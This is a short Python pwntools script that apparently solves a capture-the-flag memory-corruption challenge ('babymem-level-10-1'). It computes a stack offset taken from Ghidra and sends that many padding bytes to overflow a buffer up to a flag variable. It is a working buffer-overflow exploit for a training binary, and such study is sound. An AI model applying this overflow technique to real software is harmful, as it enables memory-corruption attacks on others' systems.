from pwn import * 

elf = ELF("/challenge/babymem-level-10-1")
io = elf.process()

# Per trovare il valore, su ghidra, distanza tra la notazione delle due var

# flag      0x11d
# buffer    0x178

dist = int("178", 16) - int("11d", 16)

io.sendline(f"{dist}")
io.sendline(b'A'*dist)

io.interactive()
